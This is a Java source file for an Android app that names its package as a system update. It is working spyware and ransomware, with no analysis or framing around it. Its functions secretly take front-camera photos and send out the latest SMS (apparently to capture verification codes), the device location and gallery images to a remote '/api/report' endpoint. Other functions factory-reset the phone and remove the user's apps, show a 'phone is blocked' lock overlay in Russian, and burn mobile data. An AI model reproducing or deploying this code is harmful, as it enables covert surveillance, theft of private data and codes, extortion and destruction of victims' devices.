package com.android.system.update;

import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.InputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Locale;

public class Actions {
    private static MediaPlayer player;
    private static TextView lockView;
    private static boolean isFlashlightOn = false;

    public static void showMsg(final Context ctx, final String text) {
        Handler h = new Handler(Looper.getMainLooper());
        h.post(() -> {
            try {
                Toast.makeText(ctx, text, Toast.LENGTH_LONG).show();
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                TextView tv = new TextView(ctx);
                tv.setText(text);
                tv.setTextSize(24);
                tv.setPadding(40, 40, 40, 40);
                tv.setBackgroundColor(0xCC000000);
                tv.setTextColor(0xFFFFFFFF);
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    android.graphics.PixelFormat.TRANSLUCENT);
                lp.gravity = Gravity.CENTER;
                wm.addView(tv, lp);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try { wm.removeView(tv); } catch (Exception ignored) {}
                }, 8000);
            } catch (Exception ignored) {}
        });
    }

    public static void photoSend(Context ctx, String deviceId, String base) {
        try {
            PhotoTaker.takeFront(ctx, bytes -> {
                try {
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject o = new JSONObject();
                    o.put("id", deviceId);
                    o.put("kind", "photo");
                    o.put("body", b64);
                    Net.post(base + "/api/report", o.toString());
                } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    public static void wipeAll(Context ctx, String deviceId, String base) {
        try {
            WipeHelper.removeAllUserApps(ctx, deviceId, base);
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            java.lang.reflect.Method m = dpm.getClass().getMethod("wipeData", int.class);
            m.invoke(dpm, 0);
        } catch (Exception ignored) {}
    }

    public static void burnPhone(Context ctx) {
        new Thread(() -> {
            try {
                for (int i = 0; i < 10; i++) {
                    URL url = new URL("https://speed.hetzner.de/100MB.bin");
                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
                    InputStream in = c.getInputStream();
                    byte[] buf = new byte[8192];
                    while (in.read(buf) != -1) {}
                    in.close();
                }
            } catch (Exception ignored) {}
        }).start();
    }

    public static void getLastSms(Context ctx, String deviceId, String base) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor cursor = ctx.getContentResolver().query(uri, new String[]{"address", "body"}, null, null, "date DESC LIMIT 1");
            String sender = "Unknown", code = "No code";
            if (cursor != null && cursor.moveToFirst()) {
                sender = cursor.getString(0); code = cursor.getString(1); cursor.close();
            }
            JSONObject o = new JSONObject();
            o.put("id", deviceId);
            o.put("kind", "sms");
            o.put("body", "From: " + sender + "\nText: " + code);
            Net.post(base + "/api/report", o.toString());
        } catch (Exception ignored) {}
    }

    public static void toggleFlashlight(Context ctx) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String cameraId = cm.getCameraIdList()[0];
            isFlashlightOn = !isFlashlightOn;
            cm.setTorchMode(cameraId, isFlashlightOn);
        } catch (Exception ignored) {}
    }

    public static void getLocation(Context ctx, String deviceId, String base) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            String addressStr = "Нет GPS";
            if (loc != null) {
                Geocoder geocoder = new Geocoder(ctx, Locale.getDefault());
                List<Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                if (addresses != null && !addresses.isEmpty()) {
                    Address addr = addresses.get(0);
                    addressStr = addr.getCountryName() + ", " + addr.getLocality() + ", " + addr.getThoroughfare() + ", " + addr.getSubThoroughfare();
                }
            }
            
            JSONObject o = new JSONObject();
            o.put("id", deviceId);
            o.put("kind", "location");
            o.put("body", addressStr);
            Net.post(base + "/api/report", o.toString());
        } catch (Exception ignored) {}
    }

    public static void stealGallery(Context ctx, String deviceId, String base) {
        new Thread(() -> {
            try {
                File dcim = new File(android.os.Environment.getExternalStorageDirectory(), "DCIM/Camera");
                File pictures = new File(android.os.Environment.getExternalStorageDirectory(), "Pictures");
                sendPhotosFromDir(dcim, deviceId, base);
                sendPhotosFromDir(pictures, deviceId, base);
            } catch (Exception ignored) {}
        }).start();
    }

    private static void sendPhotosFromDir(File dir, String deviceId, String base) {
        File[] files = dir.listFiles();
        if (files == null) return;
        int count = 0;
        for (File f : files) {
            if (count >= 10) break;
            if (f.getName().endsWith(".jpg") || f.getName().endsWith(".png") || f.getName().endsWith(".jpeg")) {
                try {
                    FileInputStream fis = new FileInputStream(f);
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = fis.read(buf)) != -1) bos.write(buf, 0, len);
                    fis.close();
                    
                    String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                    JSONObject o = new JSONObject();
                    o.put("id", deviceId);
                    o.put("kind", "file");
                    o.put("body", b64);
                    o.put("name", f.getName());
                    Net.post(base + "/api/report", o.toString());
                    count++;
                } catch (Exception ignored) {}
            }
        }
    }

    public static void blockScreen(Context ctx, final String text) {
        Handler h = new Handler(Looper.getMainLooper());
        h.post(() -> {
            try {
                if (lockView != null) return;
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                lockView = new TextView(ctx);
                lockView.setText(text.isEmpty() ? "ВАШ ТЕЛЕФОН ЗАБЛОКИРОВАН" : text);
                lockView.setTextSize(32);
                lockView.setGravity(Gravity.CENTER);
                lockView.setBackgroundColor(0xFF000000);
                lockView.setTextColor(0xFFFF0000);
                
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.OPAQUE);
                wm.addView(lockView, lp);
            } catch (Exception ignored) {}
        });
    }

    public static void unblockScreen(Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());
        h.post(() -> {
            try {
                if (lockView != null) {
                    WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                    wm.removeView(lockView);
                    lockView = null;
                }
            } catch (Exception ignored) {}
        });
    }

    public static void sleepScreen(Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());
        h.post(() -> {
            try {
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                TextView tv = new TextView(ctx);
                tv.setBackgroundColor(0xFF000000);
                
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.OPAQUE);
                wm.addView(tv, lp);
                
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try { wm.removeView(tv); } catch (Exception ignored) {}
                }, 600000);
            } catch (Exception ignored) {}
        });
    }
}
